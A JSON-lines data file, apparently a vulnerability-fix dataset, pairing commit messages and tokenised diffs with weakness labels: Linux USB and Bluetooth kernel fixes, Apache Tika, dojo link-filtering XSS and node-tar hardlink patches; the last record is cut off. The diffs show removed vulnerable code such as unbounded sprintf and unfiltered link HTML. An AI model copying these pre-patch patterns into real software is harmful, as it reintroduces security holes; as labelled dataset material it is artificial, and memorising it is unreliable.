{"contents": ["USB:", "serial:", "visor:", "fix", "crash", "on", "detecting", "device", "without", "write_urbs", "The", "visor", "driver", "crashes", "in", "clie_5_attach()", "when", "a", "specially", "crafted", "USB", "device", "without", "bulk-out", "endpoint", "is", "detected.", "This", "fix", "adds", "a", "check", "that", "the", "device", "has", "proper", "configuration", "expected", "by", "the", "driver.", "Reported-by:", "Ralf", "Spenneberg", "<ralf@spenneberg.net>", "Signed-off-by:", "Vladis", "Dronov", "<vdronov@redhat.com>", "Fixes:", "cfb8da8f69b8", "(\"USB:", "visor:", "fix", "initialisation", "of", "UX50/TH55", "devices\")", "Cc:", "stable", "<stable@vger.kernel.org>", "Signed-off-by:", "Johan", "Hovold", "<johan@kernel.org>"], "code_tokens": ["@", "@", "-", "602", ",", "8", "+", "602", ",", "10", "@", "@", "static", "int", "clie_5_attach", "(", "struct", "usb_serial", "*", "serial", ")", "*", "/", "/", "*", "some", "sanity", "check", "*", "/", "if", "(", "serial", "-", ">", "num_ports", "<", "2", ")", "return", "-", "1", ";", "if", "(", "serial", "-", ">", "num_bulk_out", "<", "2", ")", "{", "dev_err", "(", "&", "serial", "-", ">", "interface", "-", ">", "dev", ",", "\"", "missing", "bulk", "out", "endpoints", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "/", "*", "port", "0", "now", "uses", "the", "modified", "endpoint", "Address", "*", "/", "port", "=", "serial", "-", ">", "port", "[", "0", "]", ";"], "docstring_tokens": ["visor", "clie_5_attach", "nullpointer", "dereference"]}
{"contents": ["TIKA-3091", "prevent", "npe", "in", "PDFParserConfig", "by", "initializing", "three", "parameters", "with", "default", "values.", "#", "Conflicts:", "#", "tika-parsers/src/main/java/org/apache/tika/parser/pdf/PDFParserConfig.java"], "code_tokens": ["@", "@", "-", "523", ",", "6", "+", "523", ",", "17", "@", "@", "void", "setExtractInlineImages", "(", "boolean", "extractInlineImages", ")", "{", "defaultConfig", ".", "setExtractInlineImages", "(", "extractInlineImages", ")", ";", "}", "@", "Field", "void", "setAverageCharTolerance", "(", "float", "averageCharTolerance", ")", "{", "defaultConfig", ".", "setAverageCharTolerance", "(", "averageCharTolerance", ")", ";", "}", "@", "Field", "void", "setSpacingTolerance", "(", "float", "spacingTolerance", ")", "{", "defaultConfig", ".", "setSpacingTolerance", "(", "spacingTolerance", ")", ";", "}", "@", "Field", "void", "setCatchIntermediateExceptions", "(", "boolean", "catchIntermediateExceptions", ")", "{", "defaultConfig", ".", "setCatchIntermediateIOExceptions", "(", "catchIntermediateExceptions", ")", ";", "@", "@", "-", "114", ",", "10", "+", "114", ",", "16", "@", "@", "private", "static", "OCR_STRATEGY", "parse", "(", "String", "s", ")", "{", "private", "boolean", "extractMarkedContent", "=", "false", ";", "/", "/", "The", "character", "width", "-", "based", "tolerance", "value", "used", "to", "estimate", "where", "spaces", "in", "text", "should", "be", "added", "private", "Float", "averageCharTolerance", ";", "/", "/", "Default", "taken", "from", "PDFBox", ".", "private", "Float", "averageCharTolerance", "=", "0", ".", "5f", ";", "/", "/", "The", "space", "width", "-", "based", "tolerance", "value", "used", "to", "estimate", "where", "spaces", "in", "text", "should", "be", "added", "private", "Float", "spacingTolerance", ";", "/", "/", "Default", "taken", "from", "PDFBox", ".", "private", "Float", "spacingTolerance", "=", "0", ".", "3f", ";", "/", "/", "The", "multiplication", "factor", "for", "line", "height", "to", "decide", "when", "a", "new", "paragraph", "starts", ".", "/", "/", "Default", "taken", "from", "PDFBox", ".", "private", "Float", "dropThreshold", "=", "2", ".", "5f", ";", "/", "/", "If", "the", "PDF", "has", "an", "XFA", "element", ",", "process", "only", "that", "and", "skip", "extracting", "/", "/", "content", "from", "elsewhere", "in", "the", "document", ".", "@", "@", "-", "238", ",", "6", "+", "244", ",", "10", "@", "@", "private", "void", "init", "(", "InputStream", "is", ")", "{", "setSetKCMS", "(", "getBooleanProp", "(", "props", ".", "getProperty", "(", "\"", "setKCMS", "\"", "),", "false", ")", ");", "setAverageCharTolerance", "(", "getFloatProp", "(", "props", ".", "getProperty", "(", "\"", "averageCharTolerance", "\"", "),", "averageCharTolerance", ")", ");", "setSpacingTolerance", "(", "getFloatProp", "(", "props", ".", "getProperty", "(", "\"", "spacingTolerance", "\"", "),", "spacingTolerance", ")", ");", "setDropThreshold", "(", "getFloatProp", "(", "props", ".", "getProperty", "(", "\"", "dropThreshold", "\"", "),", "dropThreshold", ")", ");", "boolean", "checkExtractAccessPermission", "=", "getBooleanProp", "(", "props", ".", "getProperty", "(", "\"", "checkExtractAccessPermission", "\"", "),", "false", ")", ";", "boolean", "allowExtractionForAccessibility", "=", "getBooleanProp", "(", "props", ".", "getProperty", "(", "\"", "allowExtractionForAccessibility", "\"", "),", "true", ")", ";", "@", "@", "-", "287", ",", "6", "+", "297", ",", "9", "@", "@", "public", "void", "configure", "(", "PDF2XHTML", "pdf2XHTML", ")", "{", "if", "(", "getSpacingTolerance", "(", ")", "!", "=", "null", ")", "{", "pdf2XHTML", ".", "setSpacingTolerance", "(", "getSpacingTolerance", "(", "))", ";", "}", "if", "(", "getDropThreshold", "(", ")", "!", "=", "null", ")", "{", "pdf2XHTML", ".", "setDropThreshold", "(", "dropThreshold", ")", ";", "}", "pdf2XHTML", ".", "setSuppressDuplicateOverlappingText", "(", "getSuppressDuplicateOverlappingText", "(", "))", ";", "}", "@", "@", "-", "513", ",", "6", "+", "526", ",", "14", "@", "@", "public", "void", "setSpacingTolerance", "(", "Float", "spacingTolerance", ")", "{", "this", ".", "spacingTolerance", "=", "spacingTolerance", ";", "}", "public", "Float", "getDropThreshold", "(", ")", "{", "return", "dropThreshold", ";", "}", "public", "void", "setDropThreshold", "(", "float", "dropThreshold", ")", "{", "this", ".", "dropThreshold", "=", "dropThreshold", ";", "}", "public", "AccessChecker", "getAccessChecker", "(", ")", "{", "return", "accessChecker", ";", "}", "@", "@", "-", "824", ",", "6", "+", "845", ",", "7", "@", "@", "public", "boolean", "equals", "(", "Object", "o", ")", "{", "if", "(", "getCatchIntermediateIOExceptions", "(", ")", "!", "=", "config", ".", "getCatchIntermediateIOExceptions", "(", "))", "return", "false", ";", "if", "(", "!", "getAverageCharTolerance", "(", ").", "equals", "(", "config", ".", "getAverageCharTolerance", "(", "))", ")", "return", "false", ";", "if", "(", "!", "getSpacingTolerance", "(", ").", "equals", "(", "config", ".", "getSpacingTolerance", "(", "))", ")", "return", "false", ";", "if", "(", "!", "getDropThreshold", "(", ").", "equals", "(", "config", ".", "getDropThreshold", "(", "))", ")", "return", "false", ";", "if", "(", "!", "getOcrStrategy", "(", ").", "equals", "(", "config", ".", "getOcrStrategy", "(", "))", ")", "return", "false", ";", "if", "(", "getOcrImageType", "(", ")", "!", "=", "config", ".", "getOcrImageType", "(", "))", "return", "false", ";", "if", "(", "!", "getOcrImageFormatName", "(", ").", "equals", "(", "config", ".", "getOcrImageFormatName", "(", "))", ")", "return", "false", ";", "@", "@", "-", "844", ",", "6", "+", "866", ",", "7", "@", "@", "public", "int", "hashCode", "(", ")", "{", "result", "=", "31", "*", "result", "+", "(", "getExtractUniqueInlineImagesOnly", "(", ")", "?", "1", ":", "0", ")", ";", "result", "=", "31", "*", "result", "+", "getAverageCharTolerance", "(", ").", "hashCode", "(", ");", "result", "=", "31", "*", "result", "+", "getSpacingTolerance", "(", ").", "hashCode", "(", ");", "result", "=", "31", "*", "result", "+", "getDropThreshold", "(", ").", "hashCode", "(", ");", "result", "=", "31", "*", "result", "+", "(", "getIfXFAExtractOnlyXFA", "(", ")", "?", "1", ":", "0", ")", ";", "result", "=", "31", "*", "result", "+", "ocrStrategy", ".", "hashCode", "(", ");", "result", "=", "31", "*", "result", "+", "getOcrDPI", "(", ");", "@", "@", "-", "869", ",", "6", "+", "892", ",", "7", "@", "@", "public", "String", "toString", "(", ")", "{", "\"", ",", "extractUniqueInlineImagesOnly", "=", "\"", "+", "extractUniqueInlineImagesOnly", "+", "\"", ",", "averageCharTolerance", "=", "\"", "+", "averageCharTolerance", "+", "\"", ",", "spacingTolerance", "=", "\"", "+", "spacingTolerance", "+", "\"", ",", "dropThreshold", "=", "\"", "+", "dropThreshold", "\"", ",", "ifXFAExtractOnlyXFA", "=", "\"", "+", "ifXFAExtractOnlyXFA", "+", "\"", ",", "ocrStrategy", "=", "\"", "+", "ocrStrategy", "+", "\"", ",", "ocrDPI", "=", "\"", "+", "ocrDPI", "+", "@", "@", "-", "1528", ",", "6", "+", "1528", ",", "16", "@", "@", "public", "void", "testUnmappedUnicodeStats", "(", ")", "throws", "Exception", "{", "}", "@", "Test", "public", "void", "testNPEInPDFParserConfig", "(", ")", "{", "/", "/", "TIKA", "-", "3091", "PDFParserConfig", "config", "=", "new", "PDFParserConfig", "(", ");", "/", "/", "don", "'", "t", "care", "about", "values", ";", "want", "to", "make", "sure", "no", "NPE", "is", "thrown", "String", "txt", "=", "config", ".", "toString", "(", ");", "config", ".", "hashCode", "(", ");", "config", ".", "equals", "(", "new", "PDFParserConfig", "(", "))", ";", "}", "@", "Test", "/", "/", "TIKA", "-", "3041", "@", "Ignore", "(", "\"", "turn", "back", "on", "if", "we", "add", "file", "from", "PDFBOX", "-", "52", "\"", ")", "public", "void", "testPDFBox52", "(", ")", "throws", "Exception", "{"], "docstring_tokens": ["out", "of", "memory", "error"]}
{"contents": ["Bluetooth:", "Fix", "potential", "bad", "memory", "access", "with", "sysfs", "files", "When", "creating", "a", "high", "number", "of", "Bluetooth", "sockets", "(L2CAP,", "SCO", "and", "RFCOMM)", "it", "is", "possible", "to", "scribble", "repeatedly", "on", "arbitrary", "pages", "of", "memory.", "Ensure", "that", "the", "content", "of", "these", "sysfs", "files", "is", "always", "less", "than", "one", "page.", "Even", "if", "this", "means", "truncating.", "The", "files", "in", "question", "are", "scheduled", "to", "be", "moved", "over", "to", "debugfs", "in", "the", "future", "anyway.", "Based", "on", "initial", "patches", "from", "Neil", "Brown", "and", "Linus", "Torvalds", "Reported-by:", "Neil", "Brown", "<neilb@suse.de>", "Signed-off-by:", "Marcel", "Holtmann", "<marcel@holtmann.org>"], "code_tokens": ["@", "@", "-", "3944", ",", "16", "+", "3944", ",", "24", "@", "@", "static", "ssize_t", "l2cap_sysfs_show", "(", "struct", "class", "*", "dev", ",", "struct", "sock", "*", "sk", ";", "struct", "hlist_node", "*", "node", ";", "char", "*", "str", "=", "buf", ";", "int", "size", "=", "PAGE_SIZE", ";", "read_lock_bh", "(", "&", "l2cap_sk_list", ".", "lock", ")", ";", "sk_for_each", "(", "sk", ",", "node", ",", "&", "l2cap_sk_list", ".", "head", ")", "{", "struct", "l2cap_pinfo", "*", "pi", "=", "l2cap_pi", "(", "sk", ")", ";", "int", "len", ";", "str", "+", "=", "sprintf", "(", "str", ",", "\"", "%", "s", "%", "s", "%", "d", "%", "d", "0x", "%", "4", ".", "4x", "0x", "%", "4", ".", "4x", "%", "d", "%", "d", "%", "d", "\\", "n", "\"", ",", "len", "=", "snprintf", "(", "str", ",", "size", ",", "\"", "%", "s", "%", "s", "%", "d", "%", "d", "0x", "%", "4", ".", "4x", "0x", "%", "4", ".", "4x", "%", "d", "%", "d", "%", "d", "\\", "n", "\"", ",", "batostr", "(", "&", "bt_sk", "(", "sk", ")", "->", "src", ")", ",", "batostr", "(", "&", "bt_sk", "(", "sk", ")", "->", "dst", ")", ",", "sk", "-", ">", "sk_state", ",", "__le16_to_cpu", "(", "pi", "-", ">", "psm", ")", ",", "pi", "-", ">", "scid", ",", "pi", "-", ">", "dcid", ",", "pi", "-", ">", "imtu", ",", "pi", "-", ">", "omtu", ",", "pi", "-", ">", "sec_level", ")", ";", "size", "-", "=", "len", ";", "if", "(", "size", "<", "=", "0", ")", "break", ";", "str", "+", "=", "len", ";", "}", "read_unlock_bh", "(", "&", "l2cap_sk_list", ".", "lock", ")", ";", "@", "@", "-", "2105", ",", "6", "+", "2105", ",", "7", "@", "@", "static", "ssize_t", "rfcomm_dlc_sysfs_show", "(", "struct", "class", "*", "dev", ",", "struct", "rfcomm_session", "*", "s", ";", "struct", "list_head", "*", "pp", ",", "*", "p", ";", "char", "*", "str", "=", "buf", ";", "int", "size", "=", "PAGE_SIZE", ";", "rfcomm_lock", "(", ");", "@", "@", "-", "2113", ",", "11", "+", "2114", ",", "21", "@", "@", "static", "ssize_t", "rfcomm_dlc_sysfs_show", "(", "struct", "class", "*", "dev", ",", "list_for_each", "(", "pp", ",", "&", "s", "-", ">", "dlcs", ")", "{", "struct", "sock", "*", "sk", "=", "s", "-", ">", "sock", "-", ">", "sk", ";", "struct", "rfcomm_dlc", "*", "d", "=", "list_entry", "(", "pp", ",", "struct", "rfcomm_dlc", ",", "list", ")", ";", "int", "len", ";", "str", "+", "=", "sprintf", "(", "str", ",", "\"", "%", "s", "%", "s", "%", "ld", "%", "d", "%", "d", "%", "d", "%", "d", "\\", "n", "\"", ",", "len", "=", "snprintf", "(", "str", ",", "size", ",", "\"", "%", "s", "%", "s", "%", "ld", "%", "d", "%", "d", "%", "d", "%", "d", "\\", "n", "\"", ",", "batostr", "(", "&", "bt_sk", "(", "sk", ")", "->", "src", ")", ",", "batostr", "(", "&", "bt_sk", "(", "sk", ")", "->", "dst", ")", ",", "d", "-", ">", "state", ",", "d", "-", ">", "dlci", ",", "d", "-", ">", "mtu", ",", "d", "-", ">", "rx_credits", ",", "d", "-", ">", "tx_credits", ")", ";", "size", "-", "=", "len", ";", "if", "(", "size", "<", "=", "0", ")", "break", ";", "str", "+", "=", "len", ";", "}", "if", "(", "size", "<", "=", "0", ")", "break", ";", "}", "rfcomm_unlock", "(", ");", "@", "@", "-", "1068", ",", "13", "+", "1068", ",", "22", "@", "@", "static", "ssize_t", "rfcomm_sock_sysfs_show", "(", "struct", "class", "*", "dev", ",", "struct", "sock", "*", "sk", ";", "struct", "hlist_node", "*", "node", ";", "char", "*", "str", "=", "buf", ";", "int", "size", "=", "PAGE_SIZE", ";", "read_lock_bh", "(", "&", "rfcomm_sk_list", ".", "lock", ")", ";", "sk_for_each", "(", "sk", ",", "node", ",", "&", "rfcomm_sk_list", ".", "head", ")", "{", "str", "+", "=", "sprintf", "(", "str", ",", "\"", "%", "s", "%", "s", "%", "d", "%", "d", "\\", "n", "\"", ",", "int", "len", ";", "len", "=", "snprintf", "(", "str", ",", "size", ",", "\"", "%", "s", "%", "s", "%", "d", "%", "d", "\\", "n", "\"", ",", "batostr", "(", "&", "bt_sk", "(", "sk", ")", "->", "src", ")", ",", "batostr", "(", "&", "bt_sk", "(", "sk", ")", "->", "dst", ")", ",", "sk", "-", ">", "sk_state", ",", "rfcomm_pi", "(", "sk", ")", "->", "channel", ")", ";", "size", "-", "=", "len", ";", "if", "(", "size", "<", "=", "0", ")", "break", ";", "str", "+", "=", "len", ";", "}", "read_unlock_bh", "(", "&", "rfcomm_sk_list", ".", "lock", ")", ";", "@", "@", "-", "960", ",", "13", "+", "960", ",", "22", "@", "@", "static", "ssize_t", "sco_sysfs_show", "(", "struct", "class", "*", "dev", ",", "struct", "sock", "*", "sk", ";", "struct", "hlist_node", "*", "node", ";", "char", "*", "str", "=", "buf", ";", "int", "size", "=", "PAGE_SIZE", ";", "read_lock_bh", "(", "&", "sco_sk_list", ".", "lock", ")", ";", "sk_for_each", "(", "sk", ",", "node", ",", "&", "sco_sk_list", ".", "head", ")", "{", "str", "+", "=", "sprintf", "(", "str", ",", "\"", "%", "s", "%", "s", "%", "d", "\\", "n", "\"", ",", "int", "len", ";", "len", "=", "snprintf", "(", "str", ",", "size", ",", "\"", "%", "s", "%", "s", "%", "d", "\\", "n", "\"", ",", "batostr", "(", "&", "bt_sk", "(", "sk", ")", "->", "src", ")", ",", "batostr", "(", "&", "bt_sk", "(", "sk", ")", "->", "dst", ")", ",", "sk", "-", ">", "sk_state", ")", ";", "size", "-", "=", "len", ";", "if", "(", "size", "<", "=", "0", ")", "break", ";", "str", "+", "=", "len", ";", "}", "read_unlock_bh", "(", "&", "sco_sk_list", ".", "lock", ")", ";"], "docstring_tokens": ["information", "leak"]}
{"contents": ["Merge", "pull", "request", "from", "GHSA-cxjc-r2fp-7mq6", "*", "Add", "config", "option", "`allowUnsafeHtml`:", "default", "is", "`false`", "which", "results", "in", "`<`", "being", "replaced", "with", "`&lt;`", "*", "Add", "config", "option", "`linkFilter`:", "can", "be", "a", "function", "or", "array", "of", "filter", "pairs", "to", "control", "exactly", "what", "filtering", "is", "applied", "This", "update", "should", "minimally", "affect", "production", "applications:", "*", "The", "behavior", "of", "existing", "links", "with", "HTML", "content", "will", "be", "unchanged", "*", "Existing", "links", "that", "are", "edited", "and", "saved", "will", "be", "filtered", "(this", "is", "only", "if", "the", "link", "is", "edited,", "other", "content", "within", "the", "editor", "can", "be", "edited", "without", "affecting", "the", "link)", "*", "Newly", "created", "links", "will", "be", "filtered", "by", "default", "*", "For", "production", "code", "to", "continue", "working", "as-is", "with", "new", "data", "the", "application", "code", "will", "have", "to", "be", "updated", "to", "specify", "`true`", "for", "the", "`LinkDialog`", "plugin's", "`allowUnsafeHtml`", "option", "(cherry", "picked", "from", "commit", "7d9d4927a26a246719e153c1fad557b9a956eb60)"], "code_tokens": ["@", "@", "-", "1", ",", "5", "+", "1", ",", "6", "@", "@", "define", "(", "[", "\"", "require", "\"", ",", "\"", "dojo", "/", "_base", "/", "array", "\"", ",", "\"", "dojo", "/", "_base", "/", "declare", "\"", ",", "/", "/", "declare", "\"", "dojo", "/", "dom", "-", "attr", "\"", ",", "/", "/", "domAttr", ".", "get", "\"", "dojo", "/", "keys", "\"", ",", "/", "/", "keys", ".", "ENTER", "@", "@", "-", "11", ",", "7", "+", "12", ",", "7", "@", "@", "define", "(", "[", "\"", "..", "/", "_Plugin", "\"", ",", "\"", "..", "/.", "./", "form", "/", "DropDownButton", "\"", ",", "\"", "..", "/", "range", "\"", "]", ",", "function", "(", "require", ",", "declare", ",", "domAttr", ",", "keys", ",", "lang", ",", "on", ",", "has", ",", "query", ",", "string", ",", "]", ",", "function", "(", "require", ",", "array", ",", "declare", ",", "domAttr", ",", "keys", ",", "lang", ",", "on", ",", "has", ",", "query", ",", "string", ",", "_Plugin", ",", "DropDownButton", ",", "rangeapi", ")", "{", "/", "/", "module", ":", "@", "@", "-", "26", ",", "6", "+", "27", ",", "21", "@", "@", "define", "(", "[", "/", "/", "/", "/", "-", "createLink", "/", "/", "allowUnsafeHtml", ":", "boolean", "/", "/", "If", "false", "(", "default", ")", ",", "the", "link", "description", "will", "be", "filtered", "to", "prevent", "HTML", "content", ".", "/", "/", "If", "true", "no", "filtering", "is", "done", ",", "allowing", "for", "HTML", "content", "within", "the", "link", "element", ".", "/", "/", "The", "filter", "can", "be", "specified", "with", "the", "'", "linkFilter", "'", "option", ".", "allowUnsafeHtml", ":", "false", ",", "/", "/", "linkFilter", ":", "function", "or", "array", "of", "replacement", "pairs", "/", "/", "If", "'", "allowUnsafeHtml", "'", "is", "false", "then", "this", "filter", "will", "be", "applied", "to", "the", "link", "Description", "value", ".", "/", "/", "function", ":", "the", "function", "will", "be", "invoked", "with", "the", "string", "value", "of", "the", "Description", "field", "and", "its", "/", "/", "return", "value", "will", "be", "used", "/", "/", "array", ":", "each", "array", "item", "should", "be", "an", "array", "of", "two", "values", "to", "pass", "to", "String", "#", "replace", "linkFilter", ":", "[", "[", "/<", "/", "g", ",", "\"", "&", "lt", ";", "\"]", "]", ",", "/", "/", "Override", "_Plugin", ".", "buttonClass", ".", "This", "plugin", "is", "controlled", "by", "a", "DropDownButton", "/", "/", "(", "which", "triggers", "a", "TooltipDialog", ")", ".", "buttonClass", ":", "DropDownButton", ",", "@", "@", "-", "252", ",", "6", "+", "268", ",", "16", "@", "@", "define", "(", "[", "if", "(", "args", "&", "&", "args", ".", "urlInput", ")", "{", "args", ".", "urlInput", "=", "args", ".", "urlInput", ".", "replace", "(", "/\"", "/", "g", ",", "\"", "&", "quot", ";", "\")", ";", "}", "if", "(", "!", "this", ".", "allowUnsafeHtml", "&", "&", "args", "&", "&", "args", ".", "textInput", ")", "{", "if", "(", "typeof", "this", ".", "linkFilter", "=", "==", "'", "function", "'", "){", "args", ".", "textInput", "=", "this", ".", "linkFilter", "(", "args", ".", "textInput", ")", ";", "}", "else", "{", "array", ".", "forEach", "(", "this", ".", "linkFilter", ",", "function", "(", "currentFilter", ")", "{", "args", ".", "textInput", "=", "args", ".", "textInput", ".", "replace", "(", "currentFilter", "[", "0", "]", ",", "currentFilter", "[", "1", "]", ");", "}", ");", "}", "}", "return", "args", ";", "}", ",", "@", "@", "-", "629", ",", "8", "+", "655", ",", "15", "@", "@", "define", "(", "[", "}", ");", "/", "/", "Register", "these", "plugins", "_Plugin", ".", "registry", "[", "\"", "createLink", "\"", "]", "=", "function", "(", "){", "return", "new", "LinkDialog", "(", "{", "command", ":", "\"", "createLink", "\"", "})", ";", "_Plugin", ".", "registry", "[", "\"", "createLink", "\"", "]", "=", "function", "(", "args", ")", "{", "var", "pluginOptions", "=", "{", "command", ":", "\"", "createLink", "\"", ",", "allowUnsafeHtml", ":", "(", "\"", "allowUnsafeHtml", "\"", "in", "args", ")", "?", "args", ".", "allowUnsafeHtml", ":", "false", "}", ";", "if", "(", "\"", "linkFilter", "\"", "in", "args", ")", "{", "pluginOptions", ".", "linkFilter", "=", "args", ".", "linkFilter", ";", "}", "return", "new", "LinkDialog", "(", "pluginOptions", ")", ";", "}", ";", "_Plugin", ".", "registry", "[", "\"", "insertImage", "\"", "]", "=", "function", "(", "){", "return", "new", "ImgLinkDialog", "(", "{", "command", ":", "\"", "insertImage", "\"", "})", ";", "@", "@", "-", "7", ",", "6", "+", "7", ",", "10", "@", "@", "<", "script", "type", "=", "\"", "text", "/", "javascript", "\"", "src", "=", "\".", "./", "boilerplate", ".", "js", "\"", "><", "/", "script", ">", "<", "script", "type", "=", "\"", "text", "/", "javascript", "\"", ">", "function", "filterLink", "(", ")", "{", "return", "'", "Filtered", "Value", "'", ";", "}", "require", "(", "[", "\"", "dojo", "/", "parser", "\"", ",", "\"", "dijit", "/", "Editor", "\"", ",", "@", "@", "-", "36", ",", "6", "+", "40", ",", "22", "@", "@", "<", "/", "div", ">", "<", "/", "div", ">", "<", "p", ">", "Editor", "with", "<", "code", ">", "allowUnsafeHtml", "<", "/", "code", ">", "set", "to", "<", "code", ">", "true", "<", "/", "code", ">", "</", "p", ">", "<", "div", "style", "=", "\"", "border", ":", "1px", "dotted", "black", ";", "\">", "<", "div", "id", "=", "\"", "editorUnsafe", "\"", "data", "-", "dojo", "-", "type", "=", "\"", "dijit", "/", "Editor", "\"", "data", "-", "dojo", "-", "props", "=", "'\"", "aria", "-", "label", "\"", ":\"", "editor", "\"", ",", "extraPlugins", ":", "[{", "name", ":", "\"", "createLink", "\"", ",", "allowUnsafeHtml", ":", "true", "}", ",", "\"", "insertImage", "\"", ",", "\"", "viewSource", "\"", "]'", ">", "<", "p", ">", "This", "editor", "will", "allow", "unrestricted", "HTML", "in", "the", "Description", "field", "of", "links", "<", "/", "p", ">", "<", "br", ">", "<", "/", "div", ">", "<", "/", "div", ">", "<", "p", ">", "Editor", "with", "custom", "<", "code", ">", "linkFilter", "<", "/", "code", ">", "function", "<", "/", "p", ">", "<", "div", "style", "=", "\"", "border", ":", "1px", "dotted", "black", ";", "\">", "<", "div", "id", "=", "\"", "editorLinkFilter", "\"", "data", "-", "dojo", "-", "type", "=", "\"", "dijit", "/", "Editor", "\"", "data", "-", "dojo", "-", "props", "=", "'\"", "aria", "-", "label", "\"", ":\"", "editor", "\"", ",", "extraPlugins", ":", "[{", "name", ":", "\"", "createLink", "\"", ",", "linkFilter", ":", "filterLink", "}", ",", "\"", "insertImage", "\"", ",", "\"", "viewSource", "\"", "]'", ">", "<", "p", ">", "Links", "created", "in", "this", "editor", "will", "always", "have", "a", "description", "of", "\"", "Filtered", "Value", "\"", ",", "which", "is", "the", "value", "returned", "by", "the", "custom", "<", "code", ">", "linkFilter", "<", "/", "code", ">", "function", ".", "</", "p", ">", "<", "br", ">", "<", "/", "div", ">", "<", "/", "div", ">", "<", "p", ">", "RTL", "Editor", ":", "</", "p", ">", "<", "div", "style", "=", "\"", "border", ":", "1px", "dotted", "black", ";", "\">", "<", "div", "id", "=", "\"", "reditor", "\"", "data", "-", "dojo", "-", "type", "=", "\"", "dijit", "/", "Editor", "\"", "dir", "=", "\"", "rtl", "\"", "data", "-", "dojo", "-", "props", "=", "'\"", "aria", "-", "label", "\"", ":\"", "reditor", "\"", ",", "extraPlugins", ":", "[\"", "createLink", "\"", ",", "\"", "insertImage", "\"", "]'", ">"], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["unpack:", "only", "reuse", "file", "fs", "entries", "if", "nlink", "=", "1", "This", "matches", "behavior", "in", "bsdtar", "to", "prevent", "overwriting", "a", "hardlink", "with", "contents", "from", "a", "File", "archive", "entry."], "code_tokens": ["@", "@", "-", "12", ",", "6", "+", "12", ",", "7", "@", "@", "const", "wc", "=", "require", "(", "'.", "/", "winchars", ".", "js", "'", ")", "const", "ONENTRY", "=", "Symbol", "(", "'", "onEntry", "'", ")", "const", "CHECKFS", "=", "Symbol", "(", "'", "checkFs", "'", ")", "const", "ISREUSABLE", "=", "Symbol", "(", "'", "isReusable", "'", ")", "const", "MAKEFS", "=", "Symbol", "(", "'", "makeFs", "'", ")", "const", "FILE", "=", "Symbol", "(", "'", "file", "'", ")", "const", "DIRECTORY", "=", "Symbol", "(", "'", "directory", "'", ")", "@", "@", "-", "351", ",", "6", "+", "352", ",", "17", "@", "@", "class", "Unpack", "extends", "Parser", "{", "entry", ".", "resume", "(", ")", "}", "/", "/", "Check", "if", "we", "can", "reuse", "an", "existing", "filesystem", "entry", "safely", "and", "/", "/", "overwrite", "it", ",", "rather", "than", "unlinking", "and", "recreating", "/", "/", "Windows", "doesn", "'", "t", "report", "a", "useful", "nlink", ",", "so", "we", "just", "never", "reuse", "entries", "[", "ISREUSABLE", "]", "(", "entry", ",", "st", ")", "{", "return", "entry", ".", "type", "=", "==", "'", "File", "'", "&", "&", "!", "this", ".", "unlink", "&", "&", "st", ".", "isFile", "(", ")", "&", "&", "st", ".", "nlink", "<", "=", "1", "&", "&", "process", ".", "platform", "!", "==", "'", "win32", "'", "}", "/", "/", "check", "if", "a", "thing", "is", "there", ",", "and", "if", "so", ",", "try", "to", "clobber", "it", "[", "CHECKFS", "]", "(", "entry", ")", "{", "this", "[", "PEND", "]", "()", "@", "@", "-", "360", ",", "7", "+", "372", ",", "7", "@", "@", "class", "Unpack", "extends", "Parser", "{", "fs", ".", "lstat", "(", "entry", ".", "absolute", ",", "(", "er", ",", "st", ")", "=", ">", "{", "if", "(", "st", "&", "&", "(", "this", ".", "keep", "|", "|", "this", ".", "newer", "&", "&", "st", ".", "mtime", ">", "entry", ".", "mtime", ")", ")", "this", "[", "SKIP", "]", "(", "entry", ")", "else", "if", "(", "er", "|", "|", "(", "entry", ".", "type", "=", "==", "'", "File", "'", "&", "&", "!", "this", ".", "unlink", "&", "&", "st", ".", "isFile", "(", "))", ")", "else", "if", "(", "er", "|", "|", "this", "[", "ISREUSABLE", "]", "(", "entry", ",", "st", ")", ")", "this", "[", "MAKEFS", "]", "(", "null", ",", "entry", ")", "else", "if", "(", "st", ".", "isDirectory", "(", "))", "{", "if", "(", "entry", ".", "type", "=", "==", "'", "Directory", "'", ")", "{", "@", "@", "-", "422", ",", "7", "+", "434", ",", "7", "@", "@", "class", "UnpackSync", "extends", "Unpack", "{", "const", "st", "=", "fs", ".", "lstatSync", "(", "entry", ".", "absolute", ")", "if", "(", "this", ".", "keep", "|", "|", "this", ".", "newer", "&", "&", "st", ".", "mtime", ">", "entry", ".", "mtime", ")", "return", "this", "[", "SKIP", "]", "(", "entry", ")", "else", "if", "(", "entry", ".", "type", "=", "==", "'", "File", "'", "&", "&", "!", "this", ".", "unlink", "&", "&", "st", ".", "isFile", "(", "))", "else", "if", "(", "this", "[", "ISREUSABLE", "]", "(", "entry", ",", "st", ")", ")", "return", "this", "[", "MAKEFS", "]", "(", "null", ",", "entry", ")", "else", "{", "try", "{", "@", "@", "-", "2286", ",", "3", "+", "2286", ",", "66", "@", "@", "t", ".", "test", "(", "'", "onentry", "option", "is", "preserved", "'", ",", "t", "=", ">", "{", "t", ".", "end", "(", ")", "}", ")", "t", ".", "test", "(", "'", "do", "not", "reuse", "hardlinks", ",", "only", "nlink", "=", "1", "files", "'", ",", "t", "=", ">", "{", "const", "basedir", "=", "path", ".", "resolve", "(", "unpackdir", ",", "'", "hardlink", "-", "reuse", "'", ")", "mkdirp", ".", "sync", "(", "basedir", ")", "t", ".", "teardown", "(", "()", "=", ">", "rimraf", ".", "sync", "(", "basedir", ")", ")", "const", "now", "=", "new", "Date", "(", "'", "2018", "-", "04", "-", "30T18", ":", "30", ":", "39", ".", "025Z", "'", ")", "const", "data", "=", "makeTar", "(", "[", "{", "path", ":", "'", "overwriteme", "'", ",", "type", ":", "'", "File", "'", ",", "size", ":", "4", ",", "mode", ":", "0o644", ",", "mtime", ":", "now", "}", ",", "'", "foo", "\\", "n", "'", ",", "{", "path", ":", "'", "link", "'", ",", "linkpath", ":", "'", "overwriteme", "'", ",", "type", ":", "'", "Link", "'", ",", "mode", ":", "0o644", ",", "mtime", ":", "now", "}", ",", "{", "path", ":", "'", "link", "'", ",", "type", ":", "'", "File", "'", ",", "size", ":", "4", ",", "mode", ":", "0o644", ",", "mtime", ":", "now", "}", ",", "'", "bar", "\\", "n", "'", ",", "'", "',", "'", "'", "]", ")", "const", "checks", "=", "{", "'", "link", "'", ":", "'", "bar", "\\", "n", "'", ",", "'", "overwriteme", "'", ":", "'", "foo", "\\", "n", "'", "}", "const", "check", "=", "t", "=", ">", "{", 